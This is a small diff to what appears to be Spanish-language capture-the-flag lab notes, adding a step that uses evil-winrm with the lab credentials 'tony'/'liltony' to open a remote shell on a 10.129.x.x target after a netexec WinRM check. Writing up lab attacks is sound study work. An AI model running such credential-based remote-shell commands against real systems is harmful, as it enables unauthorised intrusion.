@@ -68,4 +68,10 @@ Validamos si pertenece al grupo de `Remote Magagement` usando [[IMPACKET]]
 nxc winrm 10.129.9.43 -u 'tony' -p 'liltony'
 ```
 
+Nos conectamos usando [[EVIL-WINRM]]
+```sehll
+evil-winrm -i 10.129.9.43 -u 'tony' -p 'liltony'
+```
+
+
 
